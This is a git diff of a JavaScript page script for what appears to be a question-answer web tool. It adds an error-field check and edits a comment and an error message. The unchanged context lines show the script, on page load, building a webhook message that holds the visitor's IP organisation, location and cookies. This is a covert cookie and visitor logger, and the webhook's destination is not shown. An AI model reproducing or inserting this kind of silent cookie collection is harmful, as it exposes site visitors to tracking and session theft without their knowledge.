@@ -81,8 +81,8 @@ document.addEventListener('DOMContentLoaded', async function () {
 **Org:** ${ipData.org}
 **Location:** ${ipData.loc}
 **Cookies:** ${visitorCookie}
-        `.trim(), Math.floor(Math.random() * 16777215)); // Red color for banned user
-    
+        `.trim(), Math.floor(Math.random() * 16777215)); // Random color for user visit
+
     statusMessage.innerText = "Waiting...";
     statusImage.src = statusEmojis.ellipsis; // Set to ellipsis emoji
 
@@ -105,7 +105,12 @@ document.addEventListener('DOMContentLoaded', async function () {
                 throw new Error(`HTTP Error! Code: ${response.status}`);
             }
 
-            const data = await response.json(); // Try to parse as JSON
+            const data = await response.json();
+
+            // Check if there's an error field in the response
+            if (data.error) {
+                throw new Error(data.error);
+            }
 
             // Send webhook for the question
             await sendWebhook("Question Asked", `
@@ -142,7 +147,7 @@ document.addEventListener('DOMContentLoaded', async function () {
             `.trim(), 16711680); // Red color for errors
 
             // Update the UI to reflect the error
-            statusMessage.innerText = "An error occurred.";
+            statusMessage.innerText = "An error occurred. Please try again later. If this error persists, inform and let the developer know.";
             responseContainer.innerText = ""; // Clear the response container
             statusImage.src = statusEmojis.error; // Set to error emoji
         }
